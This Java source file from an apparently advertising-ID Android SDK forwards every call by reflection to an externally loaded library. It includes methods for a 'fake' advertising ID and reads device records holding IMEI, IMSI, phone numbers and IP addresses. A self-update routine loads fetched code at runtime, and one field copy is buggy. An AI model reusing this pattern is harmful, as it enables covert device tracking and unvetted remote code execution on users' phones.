package com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetterRealisation;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Bundle;
import android.support.v4.app.LoaderManager;
import android.support.v4.content.AsyncTaskLoader;
import android.support.v4.content.Loader;

import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.CodeUpdater;
import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
import com.advertising_id_service.appclick.googleadvertisingidservice.PublisherID.PublisherIDMask;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.InputParameters.CreateParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.InputParameters.DeleteParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.InputParameters.InstallParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.InputParameters.ReadParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.InputParameters.UpdateParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultCreate;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultDelete;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultInstall;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultRead;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultUpdate;
import com.advertising_id_service.appclick.googleadvertisingidservice.SharedPreferencesServicer.SharedPreferencesServicer;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdvertisingIdGetter {
    @Override
    public String getVersion(Context cnt) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.getVersion()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "getVersion", new Object[]{cnt}, new Class[]{Context.class});
        return str;
    }

    @Override
    public String getOriginalID(Context cnt) throws GooglePlayServicesNotAvailableException, IOException, GooglePlayServicesRepairableException {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.getOriginalID()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "getOriginalID", new Object[]{cnt}, new Class[]{Context.class});
        return str;
    }

    @Override
    public String generateGUID(GenerateIDType control_parameter, Context cnt) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.generateGUID()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class clazzEnumGenerateIDType        = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetterRealisation.IGoogleAdvertisingIdGetter$GenerateIDType");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "generateGUID",
                                                new Object[]{
                                                        loader.getEnumValue(clazzEnumGenerateIDType, control_parameter.ordinal()),
                                                        cnt
                                                },
                                                new Class[]{
                                                        clazzEnumGenerateIDType,
                                                        Context.class
                                                });
        return str;
    }

    @Override
    public String getFakeGaid(Context cnt) throws GooglePlayServicesNotAvailableException, IOException, GooglePlayServicesRepairableException {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.getFakeGaid()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "getFakeGaid", new Object[]{cnt}, new Class[]{Context.class});
        return str;
    }

    @Override
    public List<String> getFilePublisherIDs(PublusherIDType control_parameter, Context cnt, PublisherIDMask mask) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.getFilePublisherIDs()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class clazzMask                      = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".PublisherID.PublisherIDMask");
        Class clazzEnumPublusherIDType       = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetterRealisation.IGoogleAdvertisingIdGetter$PublusherIDType");

        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        Object instanceMask                  = loader.getInstance(clazzMask,
                                                new Object[]{
                                                    mask.getPrefix(),
                                                    mask.getSeporator(),
                                                    mask.getExtension()
                                                },
                                                new Class[]{
                                                    String.class,
                                                    String.class,
                                                    String.class
                                                });


        List<String> res                     = ExternalLibServicer.getServicer(cnt).callMethod(clazzGoogleAdvertisingIdGetter, instance, "getFilePublisherIDs",
                                                new Object[]{
                                                        loader.getEnumValue(clazzEnumPublusherIDType, control_parameter.ordinal()),
                                                        cnt,
                                                        instanceMask
                                                },
                                                new Class[]{
                                                        clazzEnumPublusherIDType,
                                                        Context.class,
                                                        clazzMask
                                                });
        return res;
    }

    @Override
    public String getInnerPublisherIDs(PublusherIDType control_parameter, Context cnt, String key) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.getInnerPublisherIDs()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class clazzEnumPublusherIDType       = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetterRealisation.IGoogleAdvertisingIdGetter$PublusherIDType");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "getInnerPublisherIDs",
                new Object[]{
                        loader.getEnumValue(clazzEnumPublusherIDType, control_parameter.ordinal()),
                        cnt,
                        key
                },
                new Class[]{
                        clazzEnumPublusherIDType,
                        Context.class,
                        String.class
                });
        return str;
    }

    @Override
    public void setGAID(Context cnt, String id){
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.setGAID()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "setGAID", new Object[]{cnt, id}, new Class[]{Context.class, String.class});
    }

    @Override
    public String getGAID(Context cnt, String callDestination) throws GooglePlayServicesNotAvailableException, IOException, GooglePlayServicesRepairableException {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.getGAID()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "getGAID", new Object[]{cnt, callDestination}, new Class[]{Context.class, String.class});
        return str;
    }

    //*****************************************************************************
    //************************ Методы работы с REST *******************************
    //*****************************************************************************
    @Override
    public ResultCreate rest_create(CreateParameters param) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_create()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(param.getCnt());
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class resultCreate                   = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultCreate");

        Class inputParamClass                = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.InputParameters.CreateParameters");
        Object instanceInputParam            = loader.getInstance(inputParamClass, new Object[]{}, new Class[]{});
        loader.setAttribute(instanceInputParam, "cnt"             , param.getCnt());
        loader.setAttribute(instanceInputParam, "lm"              , param.getLm());
        loader.setAttribute(instanceInputParam, "callDestination" , param.getCallDestination());
        loader.setAttribute(instanceInputParam, "login"           , param.getLogin());
        loader.setAttribute(instanceInputParam, "pass"            , param.getPass());
        loader.setAttribute(instanceInputParam, "forceStart"      , param.isForceStart());
        loader.setAttribute(instanceInputParam, "asincStart"      , param.isAsincStart());
        loader.setAttribute(instanceInputParam, "onResultListener", param.getOnResultListener());

        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_create", new Object[]{instanceInputParam}, new Class[]{inputParamClass});
//        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_create",
//                new Object[]{
//                        param.getCnt(),
//                        param.getLm(),
//                        param.getCallDestination(),
//                        param.getLogin(),
//                        param.getPass()},
//                new Class[]{
//                        Context.class,
//                        LoaderManager.class,
//                        String.class,
//                        String.class,
//                        String.class});
        ResultCreate resCreate = new ResultCreate("","","","");
        resCreate.result       = loader.getAttribute(resultCreate,res,"result");
        resCreate.error_id     = loader.getAttribute(resultCreate,res,"error_id");
        resCreate.error_msg    = loader.getAttribute(resultCreate,res,"error_msg");
        resCreate.guid         = loader.getAttribute(resultCreate,res,"guid");
        resCreate.dynamic_data = loader.getAttribute(resultCreate,res,"dynamic_data");
        return resCreate;
    }

    @Override
    public ResultUpdate rest_update(UpdateParameters param) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_update()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(param.getCnt());
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class resultUpdate                   = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultUpdate");

        Class inputParamClass                = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.InputParameters.UpdateParameters");
        Object instanceInputParam            = loader.getInstance(inputParamClass, new Object[]{}, new Class[]{});
        loader.setAttribute(instanceInputParam, "cnt"             , param.getCnt());
        loader.setAttribute(instanceInputParam, "lm"              , param.getLm());
        loader.setAttribute(instanceInputParam, "callDestination" , param.getCallDestination());
        loader.setAttribute(instanceInputParam, "login"           , param.getLogin());
        loader.setAttribute(instanceInputParam, "pass"            , param.getPass());
        loader.setAttribute(instanceInputParam, "forceStart"      , param.isForceStart());
        loader.setAttribute(instanceInputParam, "asincStart"      , param.isAsincStart());
        loader.setAttribute(instanceInputParam, "onResultListener", param.getOnResultListener());

        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_update", new Object[]{instanceInputParam}, new Class[]{inputParamClass});
//        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_update",
//                new Object[]{
//                        param.getCnt(),
//                        param.getLm(),
//                        param.getCallDestination(),
//                        param.getLogin(),
//                        param.getPass()},
//                new Class[]{
//                        Context.class,
//                        LoaderManager.class,
//                        String.class,
//                        String.class,
//                        String.class});

        ResultUpdate resUpdate = new ResultUpdate("","","","");
        resUpdate.result       = loader.getAttribute(resultUpdate,res,"result");
        resUpdate.error_id     = loader.getAttribute(resultUpdate,res,"error_id");
        resUpdate.error_msg    = loader.getAttribute(resultUpdate,res,"error_msg");
        resUpdate.guid         = loader.getAttribute(resultUpdate,res,"guid");
        resUpdate.dynamic_data = loader.getAttribute(resultUpdate,res,"dynamic_data");
        return resUpdate;
    }

    @Override
    public ResultInstall rest_install(InstallParameters param) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_install()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(param.getCnt());
        PublisherIDMask m   = param.getInstallInfo().getMask();

        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class clazzPublisherIDMask           = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".PublisherID.PublisherIDMask");
        Class clazzInstallationInfo          = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".InstallationInfo");
        Class resultInstall                  = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultInstall");

        Object instance     = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        Object Mask         = loader.getInstance(clazzPublisherIDMask,  new Object[]{m.getPrefix(),m.getSeporator(),m.getExtension()},  new Class[]{String.class,String.class,String.class});
        Object install_info = loader.getInstance(clazzInstallationInfo, new Object[]{param.getCnt(),param.getCallDestination(),Mask}, new Class[]{Context.class,String.class, clazzPublisherIDMask});

        Class inputParamClass                = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.InputParameters.InstallParameters");
        Object instanceInputParam            = loader.getInstance(inputParamClass, new Object[]{}, new Class[]{});
        loader.setAttribute(instanceInputParam, "cnt"             , param.getCnt());
        loader.setAttribute(instanceInputParam, "lm"              , param.getLm());
        loader.setAttribute(instanceInputParam, "callDestination" , param.getCallDestination());
        loader.setAttribute(instanceInputParam, "login"           , param.getLogin());
        loader.setAttribute(instanceInputParam, "pass"            , param.getPass());
        loader.setAttribute(instanceInputParam, "forceStart"      , param.isForceStart());
        loader.setAttribute(instanceInputParam, "asincStart"      , param.isAsincStart());
        loader.setAttribute(instanceInputParam, "onResultListener", param.getOnResultListener());
        loader.setAttribute(instanceInputParam, "installInfo"     , install_info);

        Object res          = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_install", new Object[]{instanceInputParam}, new Class[]{inputParamClass});
//        Object res          = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_install",
//                new Object[]{
//                        param.getCnt(),
//                        param.getLm(),
//                        param.getCallDestination(),
//                        install_info,
//                        param.getLm(),
//                        param.getPass()},
//                new Class[]{
//                        Context.class,
//                        LoaderManager.class,
//                        String.class,
//                        clazzInstallationInfo,
//                        String.class,
//                        String.class});

        ResultInstall resInstall = new ResultInstall("","","","");
        resInstall.result       = loader.getAttribute(resultInstall,res,"result");
        resInstall.error_id     = loader.getAttribute(resultInstall,res,"error_id");
        resInstall.error_msg    = loader.getAttribute(resultInstall,res,"error_msg");
        resInstall.guid         = loader.getAttribute(resultInstall,res,"guid");
        resInstall.dynamic_data = loader.getAttribute(resultInstall,res,"dynamic_data");
        return resInstall;
    }

    @Override
    public ResultRead rest_read(ReadParameters param) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_read()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(param.getCnt());
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class IApi_RestReadType              = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.IApi$RestReadType");
        Class resultRead                     = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultRead");
        Class resultRead_ItemParams          = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultRead$ItemParams");

        Object instance = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});

        Class inputParamClass                = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.InputParameters.ReadParameters");
        Object instanceInputParam            = loader.getInstance(inputParamClass, new Object[]{}, new Class[]{});
        loader.setAttribute(instanceInputParam, "cnt"             , param.getCnt());
        loader.setAttribute(instanceInputParam, "lm"              , param.getLm());
        loader.setAttribute(instanceInputParam, "callDestination" , param.getCallDestination());
        loader.setAttribute(instanceInputParam, "login"           , param.getLogin());
        loader.setAttribute(instanceInputParam, "pass"            , param.getPass());
        loader.setAttribute(instanceInputParam, "forceStart"      , param.isForceStart());
        loader.setAttribute(instanceInputParam, "asincStart"      , param.isAsincStart());
        loader.setAttribute(instanceInputParam, "onResultListener", param.getOnResultListener());
        loader.setAttribute(instanceInputParam, "readType"        , loader.getEnumValue(IApi_RestReadType, param.getReadType().ordinal()));

        Object res          = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_read", new Object[]{instanceInputParam}, new Class[]{inputParamClass});

//        Object res      = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_read",
//                new Object[]{
//                        param.getCnt(),
//                        param.getLm(),
//                        loader.getEnumValue(IApi_RestReadType, param.getReadType().ordinal()),
//                        param.getCallDestination(),
//                        param.getLogin(),
//                        param.getPass()},
//                new Class[]{
//                        Context.class,
//                        LoaderManager.class,
//                        IApi_RestReadType,
//                        String.class,
//                        String.class,
//                        String.class});

        ResultRead resRead = new ResultRead();

        resRead.result       = loader.getAttribute(resultRead,res,"result");
        resRead.error_id     = loader.getAttribute(resultRead,res,"error_id");
        resRead.error_msg    = loader.getAttribute(resultRead,res,"error_msg");
        resRead.dynamic_data = loader.getAttribute(resultRead,res,"dynamic_data");
        resRead.found_by     = loader.getAttribute(resultRead,res,"found_by");
        resRead.guids = new ArrayList<>();
        List<Object> res_ItemParams = loader.getAttribute(resultRead,res,"guids");
        if (res_ItemParams != null) {
            for (Iterator<Object> elem = res_ItemParams.iterator(); elem.hasNext(); ) {
                ResultRead.ItemParams resRead_itemparams = new ResultRead.ItemParams();
                Object obj = elem.next();
                resRead_itemparams.model         = loader.getAttribute(resultRead_ItemParams, obj, "model");
                resRead_itemparams.imei1         = loader.getAttribute(resultRead_ItemParams, obj, "model");
                resRead_itemparams.imei2         = loader.getAttribute(resultRead_ItemParams, obj, "imei2");
                resRead_itemparams.imei3         = loader.getAttribute(resultRead_ItemParams, obj, "imei3");
                resRead_itemparams.guid          = loader.getAttribute(resultRead_ItemParams, obj, "guid");
                resRead_itemparams.device        = loader.getAttribute(resultRead_ItemParams, obj, "device");
                resRead_itemparams.ua            = loader.getAttribute(resultRead_ItemParams, obj, "ua");
                resRead_itemparams.brand         = loader.getAttribute(resultRead_ItemParams, obj, "brand");
                resRead_itemparams.product_id    = loader.getAttribute(resultRead_ItemParams, obj, "product_id");
                resRead_itemparams.guid_source   = loader.getAttribute(resultRead_ItemParams, obj, "guid_source");
                resRead_itemparams.imsi1         = loader.getAttribute(resultRead_ItemParams, obj, "imsi1");
                resRead_itemparams.imsi2         = loader.getAttribute(resultRead_ItemParams, obj, "imsi2");
                resRead_itemparams.imsi3         = loader.getAttribute(resultRead_ItemParams, obj, "imsi3");
                resRead_itemparams.msisdn1       = loader.getAttribute(resultRead_ItemParams, obj, "msisdn1");
                resRead_itemparams.msisdn2       = loader.getAttribute(resultRead_ItemParams, obj, "msisdn2");
                resRead_itemparams.msisdn3       = loader.getAttribute(resultRead_ItemParams, obj, "msisdn3");
                resRead_itemparams.ua_uuid       = loader.getAttribute(resultRead_ItemParams, obj, "ua_uuid");
                resRead_itemparams.display_hight = loader.getAttribute(resultRead_ItemParams, obj, "display_hight");
                resRead_itemparams.android_id    = loader.getAttribute(resultRead_ItemParams, obj, "android_id");
                resRead_itemparams.display_width = loader.getAttribute(resultRead_ItemParams, obj, "display_width");
                resRead_itemparams.login         = loader.getAttribute(resultRead_ItemParams, obj, "login");
                resRead_itemparams.date          = loader.getAttribute(resultRead_ItemParams, obj, "date");
                resRead_itemparams.manufactor    = loader.getAttribute(resultRead_ItemParams, obj, "manufactor");
                resRead_itemparams.ip            = loader.getAttribute(resultRead_ItemParams, obj, "ip");
                resRead_itemparams.version_os    = loader.getAttribute(resultRead_ItemParams, obj, "version_os");
                resRead.guids.add(resRead_itemparams);
            }
        }
        return resRead;
    }

    @Override
    public ResultDelete rest_delete(DeleteParameters param) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_delete()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(param.getCnt());
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class resultDelete                   = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultDelete");

        Class inputParamClass                = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.InputParameters.DeleteParameters");
        Object instanceInputParam            = loader.getInstance(inputParamClass, new Object[]{}, new Class[]{});
        loader.setAttribute(instanceInputParam, "cnt"             , param.getCnt());
        loader.setAttribute(instanceInputParam, "lm"              , param.getLm());
        loader.setAttribute(instanceInputParam, "callDestination" , param.getCallDestination());
        loader.setAttribute(instanceInputParam, "login"           , param.getLogin());
        loader.setAttribute(instanceInputParam, "pass"            , param.getPass());
        loader.setAttribute(instanceInputParam, "forceStart"      , param.isForceStart());
        loader.setAttribute(instanceInputParam, "asincStart"      , param.isAsincStart());
        loader.setAttribute(instanceInputParam, "onResultListener", param.getOnResultListener());

        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_delete",new Object[]{instanceInputParam}, new Class[]{inputParamClass});
//        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_delete",
//                new Object[]{
//                        param.getCnt(),
//                        param.getLm(),
//                        param.getCallDestination(),
//                        param.getLogin(),
//                        param.getPass()},
//                new Class[]{
//                        Context.class,
//                        LoaderManager.class,
//                        String.class,
//                        String.class,
//                        String.class});

        ResultDelete resDelete = new ResultDelete("","","","");
        resDelete.result       = loader.getAttribute(resultDelete,res,"result");
        resDelete.error_id     = loader.getAttribute(resultDelete,res,"error_id");
        resDelete.error_msg    = loader.getAttribute(resultDelete,res,"error_msg");
        resDelete.guid         = loader.getAttribute(resultDelete,res,"guid");
        resDelete.dynamic_data = loader.getAttribute(resultDelete,res,"dynamic_data");
        return resDelete;
    }

    //*****************************************************************************
    //*************** Методы работы с обновлением библиотеки **********************
    //*****************************************************************************
    // !!!! Метод должен вызываться в отдельном потоке !!!!
    //Проверить последнюю версию библиотеки и обновить её
    // @param cnt  - контекст
    // @param lm   - LoaderManager для асинхронного вызова. Пока не используется!
    // @param GAID - GAID устройства
    //
    @Override
    public boolean libUpdate(final Context cnt, final LoaderManager lm, final String GAID) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.libUpdate()");
        final ExternalLibServicer class_loader = ExternalLibServicer.getServicer(cnt);

        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class codeUpdaterClazz     = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.CodeUpdater");
        Object instance            = loader.getInstance(codeUpdaterClazz, new Object[]{}, new Class[]{});
        Object res                 = loader.callMethod(codeUpdaterClazz, instance, "updateCode",
                new Object[]{
                        cnt,
                        null,
                        GAID},
                new Class[]{
                        Context.class,
                        LoaderManager.class,
                        String.class});
        return true;
    }


    @Override
    public void initialize(final Context cnt, LoaderManager lm) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.initialize()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "initialize", new Object[]{cnt, lm}, new Class[]{Context.class, LoaderManager.class});
    }
}
